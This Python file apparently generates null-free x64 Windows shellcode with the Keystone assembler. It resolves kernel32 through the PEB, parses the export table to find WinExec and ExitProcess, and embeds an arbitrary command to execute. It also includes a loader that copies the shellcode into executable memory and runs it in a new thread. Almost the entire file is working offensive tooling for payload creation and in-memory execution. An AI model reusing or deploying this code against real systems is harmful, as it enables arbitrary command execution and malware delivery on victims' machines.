import ctypes, struct
import binascii
import os
import sys
import subprocess
from keystone import *

    
def encodeCommandnospace(command):
    # Pad commands
    print("     making "+command+" multiple of 8...")
    # Convert ASCII characters to bytes
    result = "".join("{:02x}".format(ord(c)) for c in command)
    print("     converting to bytes...")
    # Reverse the bytes for little endian formatting
    ba = bytearray.fromhex(result)
    ba.reverse()
    ba.hex()
    value=ba.hex()
    value=value.ljust(16,"F")
    a="mov rax, 0x" + value
    return(a+";")
    
def encodeCommandGlitch(command):
    # Pad commands
    print("     making "+command+" multiple of 8...")
    # Convert ASCII characters to bytes
    result = "".join("{:02x}".format(ord(c)) for c in command)
    print("     converting to bytes...")
    # Reverse the bytes for little endian formatting
    ba = bytearray.fromhex(result)
    ba.reverse()
    ba.hex()
    return("mov rax, 0x" + ba.hex()+";")
    
def encodeCommand(command):
    # Pad commands
    command = command.ljust(8, ' ')
    print("     making "+command+" multiple of 8...")
    # Convert ASCII characters to bytes
    result = "".join("{:02x}".format(ord(c)) for c in command)
    print("     converting to bytes...")
    # Reverse the bytes for little endian formatting
    ba = bytearray.fromhex(result)
    ba.reverse()
    ba.hex()
    return("     0x" + ba.hex())
 
def command(command):
    # Split command into 8 byte chunks
    size = 8
    print("splitting into 8 byte chunks...")
    chunks = [command[i:i+size] for i in range(0, len(command), size)]
 
    output = ""
 
    # Hack to account for uneven amount of data
    if (len(chunks) % 2 != 0):
       output += "mov rax, " + encodeCommand("        ") + "; "
       output += "push rax; "
 
    for i in reversed(chunks):
        output += "mov rax, " + encodeCommand(i) + "; "
        output += "push rax; "
 
    return output
 
    
    
def assemble_asm(ks,asm,sh,output,space='\\x'):

    instructions, count = ks.asm(asm)    
    
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += space+"{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
    return sh, output


rcx="rcx" #LOL
rdx="rdx"
r8="r8"
r9="r9"

def set_pointer_in_reg(pointer,reg):
    autopush=str(command(pointer))
    setreg= (
        "" +  autopush + ""
        "  mov "+reg+", rsp;"                   # Move a pointer to calc.exe into RCX.
    )
    return setreg
    
    
def set_value_in_reg(value,reg):
    setreg= (
        "  mov "+reg+", "+hex(value)+";"                   # Move a pointer to calc.exe into RCX.
    )
    return setreg    
    
def set_fun_args(argument, index=0, pointer=False, ):
    call_order=[rcx,rdx,r8,r9]
    call_reg=call_order[index]
    
    if(pointer):
        return set_pointer_in_reg(argument,call_reg)
    else:
        return set_value_in_reg(argument,call_reg)

    
def set_args_winexec(winexec_payload,reg_dest):
    autopush=str(command(winexec_payload))
    print("resulting asm for push:")
    print(autopush)
    
    print()
    CALL_FUNCTION = (
        "" +  set_fun_args( winexec_payload,index=0,pointer=True) + ""
        "" +  set_fun_args(1,index=1,pointer=False) + ""
        "  sub rsp, 0x20;"                  # Make some room on the stack so it's not clobbered by WinExec
        "  call "+reg_dest+";"                       # Call WinExec
    )
    print(CALL_FUNCTION)
    return CALL_FUNCTION
    
def find_fun_in_kernel32(fun_name,reg_dest):
    find_fun = (
        # Loop over Export Address Table to find WinExec name
        "   mov rcx, r10;"                  # Set loop counter
        "kernel32findfunction: "
        " jecxz FunctionNameFound;"         # Loop around this function until we find WinExec
        "   xor ebx,ebx;"                   # Zero EBX for use
        "   mov ebx, [r11+4+rcx*4];"        # EBX = RVA for first AddressOfName
        "   add rbx, r8;"                   # RBX = Function name VMA
        "   dec rcx;"                       # Decrement our loop by one
      # "   mov rax, 0x00636578456E6957;"   # WinExec (NULL BYTE)      
        "" +encodeCommandnospace(fun_name) +""
      # "   mov rax, 0x636F725074697845;"   # ExitProc
        "   shr rax, 0x8;"
        "   cmp [rbx], rax;"                # Check if we found WinExec
        "   jnz kernel32findfunction;"
 
        "FunctionNameFound: "
        # We found our target
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x24];"          # AddressOfNameOrdinals RVA
        "   add r11, r8;"                   # AddressOfNameOrdinals VMA
        # Get the function ordinal from AddressOfNameOrdinals
        "   inc rcx;"
        "   mov r13w, [r11+rcx*2];"         # AddressOfNameOrdinals + Counter. RCX = counter
        # Get function address from AddressOfFunctions
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x1c];"          # AddressOfFunctions RVA
        "   add r11, r8;"                   # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
        "   mov eax, [r11+4+r13*4];"        # Get the function RVA.
        "   add rax, r8;"                   # Add base address to function RVA
        "   mov "+reg_dest+", rax;"
    )
    return find_fun
    
def winexec_one_command(winexec_payload,space):

    GET_KERNEL = (
        " start: "
        #" int3;"
        #"  sub rsp, 0x208;"                # Make some room on the stack (NULL BYTE)
        "  add rsp, 0xfffffffffffffdf8;"    # Avoid Null Byte
        " locate_kernel32:"
        "   xor rcx, rcx;"                  # Zero RCX contents
        "   mov rax, gs:[rcx + 0x60];"      # 0x060 ProcessEnvironmentBlock to RAX.
        "   mov rax, [rax + 0x18];"         # 0x18  ProcessEnvironmentBlock.Ldr Offset
        "   mov rsi, [rax + 0x20];"         # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
        "   xchg rax, rsi;"                 # Swap RAX,RSI
        "   lodsq;"                         # Load qword at address (R)SI into RAX
        "   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
        "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
    )
    GET_EXPORTS = (
       # Code for parsing Export Address Table
        "   mov ebx, [rbx+0x3C]; "          # Get Kernel32 PE Signature (offset 0x3C) into EBX
        "   add rbx, r8; "                  # Add defrerenced signature offset to kernel32 base. Store in RBX.
       # "   mov edx, [rbx+0x88];"          # Offset from PE32 Signature to Export Address Table (NULL BYTE)
        "   xor r12,r12;"
        "   add r12, 0x88FFFFF;"
        "   shr r12, 0x14;"
        "   mov edx, [rbx+r12];"            # Offset from PE32 Signature to Export Address Table
         
        "   add rdx, r8;"                   # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
        "   mov r10d, [rdx+0x14];"          # Number of functions
        "   xor r11, r11;"                  # Zero R11 before use
        "   mov r11d, [rdx+0x20];"          # AddressOfNames RVA
        "   add r11, r8;"                   # AddressOfNames VMA
    )
    
    reg_dest="r14"
    FIND_FUNCTION= find_fun_in_kernel32("WinExec",reg_dest)
    
    ks = Ks(KS_ARCH_X86, KS_MODE_64)


    
    sh = b""
    output = ""
    
    sh, output=assemble_asm(ks,GET_KERNEL,sh,output)
    sh, output=assemble_asm(ks,GET_EXPORTS,sh,output)
    sh, output=assemble_asm(ks,FIND_FUNCTION,sh,output)

    CALL_FUNCTION=set_args_winexec(winexec_payload,reg_dest)

    
    sh, output=assemble_asm(ks,CALL_FUNCTION,sh,output)


    FIND_EXIT= find_fun_in_kernel32("ExitProc",reg_dest)


    sh, output=assemble_asm(ks,FIND_EXIT,sh,output)

    CALL_FUNCTION = (
        "" +  set_fun_args(1,index=0,pointer=False) + ""
        "  sub rsp, 0x20;"                  # Make some room on the stack so it's not clobbered by WinExec
        "  call "+reg_dest+";"                       # Call WinExec
    )
    sh, output=assemble_asm(ks,CALL_FUNCTION,sh,output)

    return sh,output

    
    
    
    
def run_shellcode_w4so(sh):
        
    shellcode = bytearray(sh)    
    input("Press any key to continue...");
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
        